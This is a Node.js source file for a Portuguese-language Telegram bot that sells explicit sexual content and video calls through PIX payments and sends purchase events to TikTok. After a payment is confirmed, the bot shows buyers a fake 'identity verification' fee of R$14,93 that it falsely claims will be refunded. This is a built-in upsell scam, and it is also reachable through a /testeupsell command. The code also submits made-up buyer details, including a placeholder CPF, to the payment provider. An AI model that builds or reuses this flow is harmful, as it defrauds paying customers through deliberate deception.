require('dotenv').config();

const TelegramBot = require('node-telegram-bot-api');
const QRCode = require('qrcode');
const path = require('path');
const { gerarPix, verificarPagamento } = require('./sync');
const { enviarEventoTikTok } = require('./tiktok');

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

const pagamentos = {};
const gifPath = path.join(__dirname, 'imagem', '5s.gif');

console.log('Bot iniciado!');

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;

  await bot.sendPhoto(chatId, path.join(__dirname, 'imagem', '1.png'));

  await bot.sendMessage(
    chatId,
    `Oiie 😏

Vi que você entrou aqui e resolvi te mostrar uma prévia rapidinha...
Mas isso é só uma parte 👀🔥

Entrando aqui, você ganha:

📁 +700 Mídias
🔥 Eu me masturbando pra você até gozar
🎁 Sorteios semanais de chamadas privadas
🔞 Fotos e vídeos exclusivos VIP
🎥 Ao vivo comigo, peladinha, fazendo o que você pedir

👇 Escolha uma opção abaixo:`,
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: '👀 Ver Mais', callback_data: 'ver_mais' }]
        ]
      }
    }
  );
});

bot.onText(/\/testeupsell/, async (msg) => {
  const chatId = msg.chat.id;

  await bot.sendMessage(
    chatId,
    `✅ Pagamento aprovado!

🔒 Última etapa para liberar seu acesso completo.

Por motivos de segurança e validação da plataforma, é necessário concluir a Verificação de Identidade.

💰 Valor da verificação: R$ 14,93

✅ Aprovação rápida
✅ Proteção contra acessos indevidos
✅ Liberação imediata após confirmação

⚠️ Importante: após a conclusão da validação, o valor será reembolsado diretamente para a sua conta.

👇 Clique abaixo para realizar a verificação.`,
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔒 Realizar Verificação - R$14,93', callback_data: 'comprar_upsell' }]
        ]
      }
    }
  );
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;

  try {
    switch (query.data) {
      case 'ver_mais':
        await bot.sendMessage(
          chatId,
          `Depois que você entrar, não vai mais ficar só nas prévias 👀🔥

O que você quer ver?`,
          {
            reply_markup: {
              inline_keyboard: [
                [{ text: '🎥 Vídeos e Fotos - R$12,90', callback_data: 'videos' }],
                [{ text: '📞 Videochamada - R$15,90', callback_data: 'videochamada' }],
                [{ text: '💎 VIP WhatsApp - R$18,90', callback_data: 'vip' }]
              ]
            }
          }
        );
        break;

      case 'videos':
        await bot.sendAnimation(
  chatId,
  'https://raw.githubusercontent.com/ognathan7/telegram-bot/main/imagem/5s.gif'
);

        await bot.sendMessage(
          chatId,
          `🔥 PACK MAIS ESCOLHIDO

📸 Fotos exclusivas
🎥 Vídeos completos
😈 Conteúdo completo e sem cortes

✔️ Acesso imediato após pagamento
✔️ Entrega automática
✔️ Tudo liberado de uma vez

💰 Apenas R$12,90

👇 Desbloqueie agora`,
          {
            reply_markup: {
              inline_keyboard: [
                [{ text: '💳 Comprar', callback_data: 'comprar_videos' }]
              ]
            }
          }
        );
        break;

      case 'videochamada':
        await bot.sendAnimation(
  chatId,
  'https://raw.githubusercontent.com/ognathan7/telegram-bot/main/imagem/8s.gif'
);

        await bot.sendMessage(
          chatId,
          `📹 Videochamada Particular

⚡️ Poucos horários disponíveis hoje
😏 Acesso individual e exclusivo

💰 R$15,90

Reserve antes que as vagas acabem 👇`,
          {
            reply_markup: {
              inline_keyboard: [
                [{ text: '💳 Comprar', callback_data: 'comprar_videochamada' }]
              ]
            }
          }
        );
        break;

      case 'vip':
        await bot.sendAnimation(
  chatId,
  'https://raw.githubusercontent.com/ognathan7/telegram-bot/main/imagem/4s.gif'
);

        await bot.sendMessage(
          chatId,
          `💎 VIP Vitalício + WhatsApp

✔️ +600 mídias
✔️ Conteúdo novo todos os dias
✔️ Vídeos completos
✔️ Sem censura
✔️ Atualizações frequentes

💰 R$18,90

👇 Garanta seu acesso agora`,
          {
            reply_markup: {
              inline_keyboard: [
                [{ text: '💳 Comprar', callback_data: 'comprar_vip' }]
              ]
            }
          }
        );
        break;

      case 'comprar_videos':
        await criarPagamento(chatId, 12.90, '🎥 Vídeos e Fotos');
        break;

      case 'comprar_videochamada':
        await criarPagamento(chatId, 15.90, '📹 Videochamada Particular');
        break;

      case 'comprar_vip':
        await criarPagamento(chatId, 18.90, '💎 VIP Vitalício + WhatsApp');
        break;

      case 'comprar_upsell':
        await criarPagamento(chatId, 14.93, '🔒 Verificação de Identidade');
        break;

      case 'copiar_codigo':
        if (!pagamentos[chatId]) {
          await bot.sendMessage(chatId, '❌ Nenhum PIX encontrado. Clique em comprar novamente.');
          break;
        }

        await bot.sendMessage(
          chatId,
          `📋 Copie o código abaixo:

\`${pagamentos[chatId].pixCode}\``,
          { parse_mode: 'Markdown' }
        );
        break;

      case 'ver_qrcode':
        if (!pagamentos[chatId]) {
          await bot.sendMessage(chatId, '❌ Nenhum PIX encontrado. Clique em comprar novamente.');
          break;
        }

        const qrBuffer = await QRCode.toBuffer(pagamentos[chatId].pixCode);

        await bot.sendPhoto(chatId, qrBuffer, {
          caption: '📱 Escaneie este QR Code para pagar.'
        });
        break;

      case 'verificar_pagamento':
        if (!pagamentos[chatId]) {
          await bot.sendMessage(chatId, '❌ Nenhum pagamento encontrado.');
          break;
        }

        await bot.sendMessage(chatId, '⏳ Verificando pagamento...');

        const resultado = await verificarPagamento(pagamentos[chatId].paymentCode);

const status =
  resultado.payment_status ||
  resultado.status ||
  resultado.data?.payment_status ||
  resultado.data?.status;

        console.log('Status pagamento:', status);

        if (
          status === 'completed' ||
          status === 'paid' ||
          status === 'approved'
        ) {

          await enviarEventoTikTok(
  'Purchase',
  chatId,
  pagamentos[chatId].valor,
  pagamentos[chatId].produto
);
          await bot.sendMessage(
            chatId,
            `✅ Pagamento aprovado!

🔒 Última etapa para liberar seu acesso completo.

Por motivos de segurança e validação da plataforma, é necessário concluir a Verificação de Identidade.

💰 Valor da verificação: R$ 14,93

✅ Aprovação rápida
✅ Proteção contra acessos indevidos
✅ Liberação imediata após confirmação

⚠️ Importante: após a conclusão da validação, o valor será reembolsado diretamente para a sua conta.

🔒 Esta etapa existe apenas para garantir a segurança e autenticidade do cadastro.

👇 Clique abaixo para realizar a verificação.`,
            {
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔒 Realizar Verificação - R$14,93', callback_data: 'comprar_upsell' }]
                ]
              }
            }
          );
        } else {
          await bot.sendMessage(
            chatId,
            `⏳ Pagamento ainda não identificado.

Status atual: ${status || 'pendente'}

Se você já pagou, aguarde alguns segundos e clique em verificar novamente.`
          );
        }

        break;
    }
  } catch (error) {
    console.log('ERRO COMPLETO:');
    console.log('Erro:', error.message);

    await bot.sendMessage(
      chatId,
      `❌ ${JSON.stringify(error.response?.data || error.message)}`
    );
  }
});

async function criarPagamento(chatId, valor, produto) {
  await bot.sendMessage(chatId, '⏳ Gerando seu PIX...');

  await enviarEventoTikTok(
  'InitiateCheckout',
  chatId,
  valor,
  produto
);

  const pix = await gerarPix(
  valor,
  {
    name: 'Cliente Telegram',
    email: 'cliente@email.com',
    document: '52998224725',
    phone: '61999999999'
  },
  produto
);

  console.log('PIX RETORNO:', JSON.stringify(pix));

  pagamentos[chatId] = {
  pixCode:
    pix.pix?.pix_qrcode_text ||
    pix.pix_qrcode_text,

  paymentCode:
    pix.payment_code,

  valor,
  produto
};

console.log('PAYMENT CODE:', pagamentos[chatId].paymentCode);

  if (produto === '🔒 Verificação de Identidade') {
    await bot.sendMessage(
      chatId,
      `🔒 Verificação de Identidade

Para concluir a validação da sua conta, realize o pagamento da taxa de verificação abaixo.

✅ Aprovação rápida
✅ Validação automática
✅ Liberação imediata após confirmação

⚠️ Após a conclusão da validação, o valor será reembolsado diretamente para a sua conta.

🔒 Esta etapa é necessária para validar a autenticidade do cadastro e liberar a continuidade do processo.

👇 Finalize o pagamento para continuar.`
    );
  } else {
    await bot.sendMessage(
      chatId,
      `✅ Como realizar o pagamento:

1. Abra o aplicativo do seu banco.
2. Selecione a opção "Pagar" ou "PIX".
3. Escolha "PIX Copia e Cola".
4. Cole a chave abaixo e finalize o pagamento com segurança.

📦 Produto: ${produto}
💰 Valor: R$ ${valor.toFixed(2).replace('.', ',')}`
    );
  }

  await bot.sendMessage(
    chatId,
    `📋 Copie o código abaixo:

\`${pagamentos[chatId].pixCode}\``,
    { parse_mode: 'Markdown' }
  );

  await bot.sendMessage(
    chatId,
    `Após efetuar o pagamento, clique no botão abaixo ⬇️`,
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: '✅ Verificar Pagamento', callback_data: 'verificar_pagamento' }],
          [{ text: '📋 Copiar Código', callback_data: 'copiar_codigo' }],
          [{ text: '📱 Ver QR Code', callback_data: 'ver_qrcode' }]
        ]
      }
    }
  );
}
